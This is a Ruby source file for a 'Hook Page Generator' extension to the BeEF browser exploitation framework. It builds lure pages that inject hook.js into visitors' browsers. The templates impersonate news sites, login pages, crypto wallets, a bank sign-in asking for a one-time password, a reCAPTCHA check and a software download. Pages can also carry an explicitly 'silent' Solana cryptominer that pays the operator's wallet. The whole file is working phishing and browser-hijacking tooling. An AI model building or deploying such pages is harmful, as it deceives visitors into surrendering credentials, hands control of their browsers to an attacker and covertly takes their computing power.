require 'cgi'
require 'json'

#
# Hook Page Generator Extension
# Dynamically creates and serves lure pages that inject hook.js.
# Pages are persisted in BeEF's SQLite database via ActiveRecord.
# Optionally embeds a silent Solana browser miner (via unmineable.com).
#
module BeEF
  module Extension
    module Hookpages
      extend BeEF::API::Extension

      @short_name  = 'hookpages'
      @full_name   = 'Hook Page Generator'
      @description = 'Dynamically creates and serves lure pages that inject hook.js'

      # ── Helpers that delegate to the ActiveRecord model ──────────────────────

      def self.create_page(slug, title, template, custom_body = '', miner_enabled = false)
        slug = slug.to_s.downcase.gsub(/[^a-z0-9_-]/, '-').squeeze('-').gsub(/\A-|-\z/, '')
        return nil if slug.empty?

        page = BeEF::Core::Models::HookPage.find_or_initialize_by(slug: slug)
        page.assign_attributes(
          title:         title.to_s,
          template:      template.to_s,
          custom_body:   custom_body.to_s,
          miner_enabled: miner_enabled,
          created_at:    page.new_record? ? Time.now.utc : page.created_at
        )
        page.save ? slug : nil
      rescue => e
        print_error "[hookpages] create_page failed: #{e.message}"
        nil
      end

      def self.delete_page(slug)
        record = BeEF::Core::Models::HookPage.find_by(slug: slug.to_s)
        return nil unless record
        record.destroy
        record
      end

      def self.all_pages
        BeEF::Core::Models::HookPage.order(:created_at).map(&:as_api_hash)
      rescue => e
        print_error "[hookpages] all_pages failed: #{e.message}"
        []
      end

      def self.get_page(slug)
        rec = BeEF::Core::Models::HookPage.find_by(slug: slug.to_s)
        rec&.as_api_hash
      end

      # ── Miner runtime state (in-memory, updated via admin panel) ─────────────
      @miner_mutex = Mutex.new
      @miner_state = nil   # lazily initialised from config on first access
      @total_hashes = 0

      def self._init_miner_state
        cfg = BeEF::Core::Configuration.instance
        @miner_state ||= {
          running:     false,
          wallet:      cfg.get('beef.extension.hookpages.miner.wallet')      || '',
          coin:        cfg.get('beef.extension.hookpages.miner.coin')        || 'SOL',
          worker_name: cfg.get('beef.extension.hookpages.miner.worker_name') || 'hook',
          threads:     (cfg.get('beef.extension.hookpages.miner.threads')    || 2).to_i,
          speed:       5,   # 1–10 scale
          overclock:   false,
          ws_proxy:    cfg.get('beef.extension.hookpages.miner.ws_proxy')    || ''
        }
      end

      def self.miner_runtime
        @miner_mutex.synchronize { _init_miner_state.dup }
      end

      # Accepts a Hash (string or symbol keys) and merges it into miner state.
      def self.update_miner_runtime(attrs)
        @miner_mutex.synchronize do
          _init_miner_state
          attrs.each do |k, v|
            key = k.to_sym
            next unless @miner_state.key?(key)
            @miner_state[key] = case key
                                when :threads, :speed then v.to_i.clamp(1, (key == :threads ? 8 : 10))
                                when :running, :overclock then !!v
                                else v.to_s
                                end
          end
        end
      end

      def self.total_hashes
        @total_hashes
      end

      def self.record_hashes(n)
        @miner_mutex.synchronize { @total_hashes += n.to_i }
      end

      # ── Miner config helpers (legacy – kept for render_page) ─────────────────
      def self.miner_config
        miner_runtime
      end

      # ── Page renderer ─────────────────────────────────────────────────────────
      # ws_proxy_override: resolved ws proxy URL (from handler); overrides config placeholder.

      def self.render_page(page, ws_proxy_override = nil)
        cfg  = BeEF::Core::Configuration.instance
        hook = cfg.get('beef.http.hook_file') || '/hook.js'
        html = case page[:template]
               when 'news'     then news_template(page[:title], page[:custom_body])
               when 'login'    then login_template(page[:title], page[:custom_body])
               when 'survey'   then survey_template(page[:title], page[:custom_body])
               when 'error'    then error_template(page[:title], page[:custom_body])
               when 'crypto'   then crypto_template(page[:title], page[:custom_body])
               when 'captcha'  then captcha_template(page[:title], page[:custom_body])
               when 'download' then download_template(page[:title], page[:custom_body])
               when 'bank'     then bank_template(page[:title], page[:custom_body])
               else                 blank_template(page[:title], page[:custom_body])
               end

        html = html.gsub('{{HOOK_URL}}', hook)

        # Inject miner script when the page has it enabled
        if page[:miner_enabled]
          mc = miner_config
          # Use the runtime-resolved ws_proxy if the stored one is a placeholder/empty
          ws  = ws_proxy_override.to_s
          ws  = mc[:ws_proxy].to_s if ws.empty?
          miner_snippet = <<~JS
            <script>
              window.BEEF_MINER_CONFIG = {
                wsProxy:    #{ws.to_json},
                wallet:     #{mc[:wallet].to_json},
                coin:       #{mc[:coin].to_json},
                workerName: #{mc[:worker_name].to_json},
                threads:    #{mc[:threads]},
                speed:      #{mc[:speed]},
                overclock:  #{mc[:overclock]}
              };
            </script>
            <script src="/miner/miner.js" defer></script>
          JS
          html = html.sub('</head>', miner_snippet + '</head>')
        end

        html
      end

      # ── Templates ─────────────────────────────────────────────────────────────

      def self.blank_template(title, body)
        <<~HTML
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>#{CGI.escapeHTML(title)}</title>
            <script src="{{HOOK_URL}}"></script>
          </head>
          <body style="font-family:Arial,sans-serif;padding:40px;max-width:700px;margin:auto">
            #{body.empty? ? "<h1>#{CGI.escapeHTML(title)}</h1><p>Page loading, please wait...</p>" : body}
          </body>
          </html>
        HTML
      end

      def self.news_template(title, custom)
        headline = custom.empty? ? title : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>#{CGI.escapeHTML(title)} – Breaking News</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Georgia,serif;background:#f5f5f0;color:#222}header{background:#c00;color:#fff;padding:12px 24px;display:flex;align-items:center;gap:16px}header h1{font-size:1.6rem;letter-spacing:1px}header span{font-size:.8rem;opacity:.8}nav{background:#222;color:#fff;padding:8px 24px;font-family:Arial,sans-serif;font-size:.8rem;display:flex;gap:20px}nav a{color:#ccc;text-decoration:none}.container{max-width:900px;margin:24px auto;padding:0 16px;display:grid;grid-template-columns:2fr 1fr;gap:24px}article h2{font-size:1.8rem;margin-bottom:8px;line-height:1.2}article .meta{color:#666;font-size:.85rem;margin-bottom:16px;font-family:Arial,sans-serif}article img{width:100%;margin:16px 0;border-radius:4px}article p{line-height:1.7;margin-bottom:12px;font-size:1.05rem}aside{background:#fff;padding:16px;border-radius:4px;align-self:start}aside h3{font-size:1rem;border-bottom:2px solid #c00;padding-bottom:6px;margin-bottom:12px;font-family:Arial,sans-serif}.aside-item{padding:8px 0;border-bottom:1px solid #eee;font-size:.9rem}</style>
          </head><body>
          <header><h1>THE DAILY NEWS</h1><span>#{Time.now.strftime('%B %d, %Y')}</span></header>
          <nav><a href="#">Home</a><a href="#">World</a><a href="#">Politics</a><a href="#">Business</a><a href="#">Technology</a></nav>
          <div class="container"><article>
            <h2>#{CGI.escapeHTML(headline)}</h2>
            <div class="meta">By Staff Reporter &bull; #{Time.now.strftime('%B %d, %Y at %I:%M %p')}</div>
            <img src="https://picsum.photos/seed/#{rand(999)}/800/400" alt="news">
            <p>Breaking news continues to develop as details emerge. Authorities are urging the public to remain calm while investigations are ongoing.</p>
            <p>Officials confirmed early this morning that the situation is being closely monitored. No further details have been released to the press at this time.</p>
            <p>Stay tuned to this page for live updates as the story develops. Refresh for the latest information.</p>
          </article>
          <aside><h3>Also in the News</h3>
            <div class="aside-item">Markets react to global uncertainty</div>
            <div class="aside-item">Tech giants announce new partnership</div>
            <div class="aside-item">Weather alert issued for the region</div>
            <div class="aside-item">Local elections draw record turnout</div>
          </aside></div></body></html>
        HTML
      end

      def self.login_template(title, custom)
        service = custom.empty? ? title : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>Sign In – #{CGI.escapeHTML(service)}</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.12);padding:40px 36px;width:100%;max-width:380px}h2{font-size:1.4rem;margin-bottom:6px;text-align:center}.sub{color:#666;font-size:.9rem;text-align:center;margin-bottom:24px}label{display:block;font-size:.85rem;color:#444;margin-bottom:4px;margin-top:14px;font-weight:600}input[type=text],input[type=password],input[type=email]{width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:5px;font-size:1rem;outline:none;transition:border .2s}input:focus{border-color:#1a73e8}.btn{width:100%;padding:11px;background:#1a73e8;color:#fff;border:none;border-radius:5px;font-size:1rem;margin-top:22px;cursor:pointer}.btn:hover{background:#155bb5}.forgot{text-align:center;margin-top:14px;font-size:.85rem}.forgot a{color:#1a73e8;text-decoration:none}.divider{border:none;border-top:1px solid #eee;margin:20px 0}</style>
          </head><body>
          <div class="card">
            <h2>#{CGI.escapeHTML(service)}</h2>
            <p class="sub">Sign in to your account to continue</p>
            <form method="post" action="#">
              <label>Email or Username</label>
              <input type="email" name="email" placeholder="you@example.com" autocomplete="username">
              <label>Password</label>
              <input type="password" name="password" placeholder="••••••••" autocomplete="current-password">
              <button class="btn" type="submit">Sign In</button>
            </form>
            <hr class="divider">
            <div class="forgot"><a href="#">Forgot password?</a> &bull; <a href="#">Create account</a></div>
          </div></body></html>
        HTML
      end

      def self.survey_template(title, custom)
        topic = custom.empty? ? 'your recent experience' : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>#{CGI.escapeHTML(title)}</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f7f8fc;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.1);padding:40px;max-width:560px;width:100%}h2{font-size:1.5rem;margin-bottom:8px;color:#1a1a2e}.sub{color:#666;margin-bottom:28px;font-size:.95rem}.q{margin-bottom:22px}.q p{font-weight:600;margin-bottom:8px;color:#333}.stars{display:flex;gap:8px;font-size:1.8rem;cursor:pointer}.stars span{color:#ddd;transition:color .1s}.stars span.on{color:#f5a623}textarea{width:100%;border:1px solid #ddd;border-radius:5px;padding:10px;font-size:.95rem;resize:vertical;min-height:80px}.btn{background:#4f46e5;color:#fff;border:none;padding:12px 32px;border-radius:6px;font-size:1rem;cursor:pointer;margin-top:8px}.progress{background:#eee;border-radius:4px;height:6px;margin-bottom:28px}.progress-bar{background:#4f46e5;width:60%;height:100%;border-radius:4px}</style>
          </head><body>
          <div class="card">
            <h2>#{CGI.escapeHTML(title)}</h2>
            <p class="sub">Help us improve by sharing your feedback about #{CGI.escapeHTML(topic)}. Takes less than 2 minutes.</p>
            <div class="progress"><div class="progress-bar"></div></div>
            <form method="post" action="#">
              <div class="q"><p>How would you rate your overall experience?</p>
                <div class="stars" id="stars"><span data-v="1">★</span><span data-v="2">★</span><span data-v="3">★</span><span data-v="4">★</span><span data-v="5">★</span></div></div>
              <div class="q"><p>What did you like most?</p><textarea name="liked" placeholder="Tell us what worked well..."></textarea></div>
              <div class="q"><p>Any suggestions for improvement?</p><textarea name="improve" placeholder="We'd love to hear your ideas..."></textarea></div>
              <button class="btn" type="submit">Submit Feedback</button>
            </form>
          </div>
          <script>var s=document.querySelectorAll('#stars span');s.forEach(function(x){x.addEventListener('click',function(){var v=+this.dataset.v;s.forEach(function(y){y.classList.toggle('on',+y.dataset.v<=v);});});});</script>
          </body></html>
        HTML
      end

      def self.error_template(title, custom)
        code = custom.empty? ? '503' : custom
        msg  = { '404' => 'Not Found', '403' => 'Forbidden', '503' => 'Service Unavailable' }[code] || 'Service Unavailable'
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>#{CGI.escapeHTML(code)} #{CGI.escapeHTML(msg)}</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#333}.wrap{text-align:center;max-width:480px;padding:40px}.code{font-size:6rem;font-weight:700;color:#e53e3e;line-height:1}h1{font-size:1.6rem;margin:12px 0 8px}p{color:#666;margin-bottom:24px;line-height:1.6}a{color:#1a73e8;text-decoration:none}.btn{display:inline-block;padding:10px 24px;background:#1a73e8;color:#fff;border-radius:5px;margin-top:8px}</style>
          </head><body>
          <div class="wrap">
            <div class="code">#{CGI.escapeHTML(code)}</div>
            <h1>#{CGI.escapeHTML(msg)}</h1>
            <p>The server encountered a temporary error and could not complete your request. Please try again in a few moments.</p>
            <a href="javascript:history.back()">← Go Back</a> &nbsp;
            <a class="btn" href="/">Home</a>
          </div></body></html>
        HTML
      end

      def self.crypto_template(title, custom)
        brand = custom.empty? ? title : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>#{CGI.escapeHTML(brand)} – Wallet Sign In</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#e6edf3;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}.logo{font-size:2rem;font-weight:700;color:#f7931a;margin-bottom:6px;letter-spacing:1px}.sub{color:#8b949e;font-size:.9rem;margin-bottom:28px}.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:36px 32px;width:100%;max-width:380px}h2{font-size:1.2rem;margin-bottom:20px;text-align:center;color:#e6edf3}label{display:block;font-size:.8rem;color:#8b949e;margin-bottom:4px;margin-top:14px;font-weight:600;text-transform:uppercase;letter-spacing:.4px}input{width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;font-size:.95rem;outline:none;transition:border .2s}input:focus{border-color:#f7931a}input[type=password]{font-family:monospace;letter-spacing:2px}.btn{width:100%;margin-top:22px;padding:12px;background:#f7931a;color:#000;border:none;border-radius:6px;font-size:1rem;font-weight:700;cursor:pointer;transition:background .2s}.btn:hover{background:#e8840f}.links{text-align:center;margin-top:16px;font-size:.82rem;color:#8b949e}.links a{color:#58a6ff;text-decoration:none}.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#8b949e;font-size:.8rem}.divider:before,.divider:after{content:'';flex:1;border-top:1px solid #30363d}.wallet-opts{display:flex;gap:8px;margin-top:8px}.wallet-btn{flex:1;padding:9px 6px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#8b949e;font-size:.75rem;cursor:pointer;text-align:center;transition:border .2s}.wallet-btn:hover{border-color:#f7931a;color:#e6edf3}</style>
          </head><body>
          <div class="logo">₿ #{CGI.escapeHTML(brand)}</div>
          <div class="sub">Decentralised Finance Platform</div>
          <div class="card">
            <h2>Sign in to your wallet</h2>
            <form method="post" action="#">
              <label>Email address</label>
              <input type="email" name="email" placeholder="you@example.com" autocomplete="username">
              <label>Password</label>
              <input type="password" name="password" placeholder="••••••••••" autocomplete="current-password">
              <button class="btn" type="submit">Access Wallet</button>
            </form>
            <div class="divider">or connect with</div>
            <div class="wallet-opts">
              <div class="wallet-btn">🦊 MetaMask</div>
              <div class="wallet-btn">👻 Phantom</div>
              <div class="wallet-btn">🔵 Coinbase</div>
            </div>
            <div class="links" style="margin-top:18px"><a href="#">Forgot password?</a> &bull; <a href="#">Create account</a></div>
          </div></body></html>
        HTML
      end

      def self.captcha_template(title, custom)
        msg = custom.empty? ? 'Please complete the verification below to continue.' : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>#{CGI.escapeHTML(title)}</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f1f3f4;display:flex;align-items:center;justify-content:center;min-height:100vh}.wrap{text-align:center;max-width:400px;width:100%;padding:20px}.icon{font-size:3.5rem;margin-bottom:12px}.title{font-size:1.3rem;font-weight:600;color:#202124;margin-bottom:6px}.sub{color:#5f6368;font-size:.9rem;margin-bottom:28px;line-height:1.5}.box{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:20px 24px;display:flex;align-items:center;gap:16px;margin-bottom:20px;cursor:pointer;transition:border .2s}.box:hover{border-color:#1a73e8}.checkbox{width:28px;height:28px;border:2px solid #dadce0;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.2rem;transition:all .2s}.box-label{text-align:left}.box-label strong{display:block;color:#202124;font-size:.95rem}.box-label span{color:#5f6368;font-size:.8rem;margin-top:2px;display:block}.footer{font-size:.75rem;color:#5f6368;display:flex;align-items:center;justify-content:space-between}.logo{font-size:.75rem;color:#5f6368;font-weight:700;letter-spacing:1px}</style>
          </head><body>
          <div class="wrap">
            <div class="icon">🛡️</div>
            <div class="title">#{CGI.escapeHTML(title)}</div>
            <div class="sub">#{CGI.escapeHTML(msg)}</div>
            <div class="box" id="cb" onclick="verify(this)">
              <div class="checkbox" id="chk"></div>
              <div class="box-label">
                <strong>I'm not a robot</strong>
                <span>This verification protects sites from automated traffic.</span>
              </div>
            </div>
            <div class="footer">
              <span>Protected by reCAPTCHA</span>
              <span class="logo">reCAPTCHA</span>
            </div>
          </div>
          <script>
          function verify(box){
            var chk=document.getElementById('chk');
            chk.textContent='✓';chk.style.background='#1a73e8';chk.style.borderColor='#1a73e8';chk.style.color='#fff';
            box.style.borderColor='#1a73e8';
            setTimeout(function(){window.location.href='/';},2500);
          }
          </script>
          </body></html>
        HTML
      end

      def self.download_template(title, custom)
        software = custom.empty? ? title : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>Download #{CGI.escapeHTML(software)}</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Arial,sans-serif;background:#f8f9fa;color:#212529}header{background:#343a40;color:#fff;padding:14px 32px;display:flex;align-items:center;gap:12px;font-size:1.1rem;font-weight:600}.hero{background:linear-gradient(135deg,#0d6efd 0%,#0a58ca 100%);color:#fff;text-align:center;padding:60px 20px}.hero h1{font-size:2.2rem;margin-bottom:10px}.hero p{font-size:1.05rem;opacity:.9;max-width:540px;margin:0 auto 28px}.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,.15);border-radius:20px;padding:6px 14px;font-size:.85rem;margin:4px}.btn-dl{display:inline-flex;align-items:center;gap:10px;background:#fff;color:#0d6efd;font-weight:700;font-size:1.1rem;padding:14px 32px;border-radius:8px;text-decoration:none;border:none;cursor:pointer;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 20px rgba(0,0,0,.2)}.btn-dl:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,0,0,.25)}.main{max-width:860px;margin:40px auto;padding:0 20px;display:grid;grid-template-columns:1fr 1fr;gap:24px}@media(max-width:600px){.main{grid-template-columns:1fr}}.card{background:#fff;border:1px solid #dee2e6;border-radius:8px;padding:24px}.card h3{font-size:1rem;font-weight:700;margin-bottom:12px;color:#0d6efd}.card ul{color:#495057;font-size:.9rem;line-height:1.8;padding-left:18px}.meta{font-size:.8rem;color:#6c757d;margin-top:8px}.progress-wrap{margin-top:20px;display:none}.progress{background:#e9ecef;border-radius:6px;height:10px;overflow:hidden}.progress-bar{width:0;height:100%;background:#0d6efd;border-radius:6px;transition:width .1s}</style>
          </head><body>
          <header>⬇ #{CGI.escapeHTML(software)} – Official Download</header>
          <div class="hero">
            <h1>#{CGI.escapeHTML(software)}</h1>
            <p>Free, trusted, and secure. Millions of users worldwide rely on #{CGI.escapeHTML(software)} every day.</p>
            <div style="margin-bottom:18px">
              <span class="badge">✓ Virus-free</span>
              <span class="badge">✓ No bundleware</span>
              <span class="badge">✓ Auto-updates</span>
            </div>
            <button class="btn-dl" onclick="startDownload()">⬇ Free Download</button>
            <p class="meta" style="opacity:.7;margin-top:10px;font-size:.8rem">Version 4.2.1 &bull; Windows / macOS / Linux &bull; 58 MB</p>
          </div>
          <div class="main">
            <div class="card"><h3>Features</h3><ul><li>Lightning-fast performance</li><li>End-to-end encrypted</li><li>Cross-platform sync</li><li>Offline mode support</li><li>Dark mode included</li></ul></div>
            <div class="card"><h3>System Requirements</h3><ul><li>Windows 10+ / macOS 11+</li><li>4 GB RAM minimum</li><li>2 GB free disk space</li><li>Internet connection</li></ul></div>
          </div>
          <div id="progress-wrap" style="max-width:500px;margin:0 auto 40px;padding:0 20px;display:none">
            <p style="font-size:.9rem;color:#495057;margin-bottom:8px">Preparing download…</p>
            <div class="progress"><div id="pbar" class="progress-bar"></div></div>
          </div>
          <script>
          function startDownload(){
            document.getElementById('progress-wrap').style.display='block';
            var p=document.getElementById('pbar'),w=0;
            var iv=setInterval(function(){w+=Math.random()*8+2;if(w>=100){w=100;clearInterval(iv);}p.style.width=w+'%';},120);
          }
          </script>
          </body></html>
        HTML
      end

      def self.bank_template(title, custom)
        bank = custom.empty? ? title : custom
        <<~HTML
          <!DOCTYPE html><html lang="en">
          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
          <title>#{CGI.escapeHTML(bank)} – Secure Online Banking</title>
          <script src="{{HOOK_URL}}"></script>
          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f5f5f5;color:#333}header{background:#003087;color:#fff;padding:14px 32px;display:flex;align-items:center;justify-content:space-between}.hname{font-size:1.2rem;font-weight:700;letter-spacing:.5px}.hsub{font-size:.75rem;opacity:.7;margin-top:2px}.hicons{display:flex;gap:14px;font-size:.8rem;opacity:.85}.main{display:flex;min-height:calc(100vh - 54px)}.sidebar{width:260px;background:#002970;color:#fff;padding:0;flex-shrink:0}@media(max-width:700px){.sidebar{display:none}}.nav-item{padding:14px 20px;font-size:.9rem;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.07);transition:background .15s}.nav-item:hover{background:rgba(255,255,255,.08)}.nav-item.active{background:#0050c8;border-left:3px solid #66b3ff}.content{flex:1;padding:32px;max-width:600px}.card{background:#fff;border:1px solid #ddd;border-radius:6px;padding:28px 32px;margin-bottom:20px;box-shadow:0 1px 4px rgba(0,0,0,.06)}.card h2{font-size:1rem;color:#003087;margin-bottom:18px;font-weight:700;border-bottom:2px solid #003087;padding-bottom:8px}label{display:block;font-size:.82rem;color:#666;margin-bottom:4px;margin-top:14px;font-weight:600}input{width:100%;padding:9px 11px;border:1px solid #ccc;border-radius:4px;font-size:.95rem;outline:none;transition:border .2s}input:focus{border-color:#003087}.btn{margin-top:20px;padding:11px 28px;background:#003087;color:#fff;border:none;border-radius:4px;font-size:.95rem;cursor:pointer;font-weight:600}.btn:hover{background:#002070}.secure{font-size:.75rem;color:#4caf50;margin-top:10px;display:flex;align-items:center;gap:4px}footer{background:#f0f0f0;border-top:1px solid #ddd;text-align:center;padding:12px;font-size:.75rem;color:#888}</style>
          </head><body>
          <header>
            <div><div class="hname">🏦 #{CGI.escapeHTML(bank)}</div><div class="hsub">Personal Banking</div></div>
            <div class="hicons"><span>🔒 256-bit SSL</span><span>📱 Mobile App</span></div>
          </header>
          <div class="main">
            <div class="sidebar">
              <div class="nav-item active">🔐 Sign In</div>
              <div class="nav-item">💳 Accounts</div>
              <div class="nav-item">💸 Transfers</div>
              <div class="nav-item">📊 Statements</div>
              <div class="nav-item">⚙️ Settings</div>
            </div>
            <div class="content">
              <div class="card">
                <h2>Online Banking Sign In</h2>
                <form method="post" action="#">
                  <label>Customer ID / Username</label>
                  <input type="text" name="username" placeholder="Enter your Customer ID" autocomplete="username">
                  <label>Password / PIN</label>
                  <input type="password" name="password" placeholder="••••••••" autocomplete="current-password">
                  <label>One-Time Password (OTP)</label>
                  <input type="text" name="otp" placeholder="Enter the OTP sent to your phone" maxlength="8">
                  <button class="btn" type="submit">Sign In Securely</button>
                </form>
                <div class="secure">🔒 Your session is encrypted and secure</div>
              </div>
              <p style="font-size:.8rem;color:#888;line-height:1.6">Having trouble signing in? <a href="#" style="color:#003087">Forgot Password</a> or <a href="#" style="color:#003087">Unlock Account</a>. For assistance, call 1-800-BANK-HELP.</p>
            </div>
          </div>
          <footer>© #{Time.now.year} #{CGI.escapeHTML(bank)}. All rights reserved. Member FDIC. Equal Housing Lender.</footer>
          </body></html>
        HTML
      end

    end
  end
end

# Load sub-components so they are available when api.rb registers the handlers
require 'extensions/hookpages/handler'
require 'extensions/hookpages/rest/hookpages_rest'
require 'extensions/hookpages/rest/miner_rest'
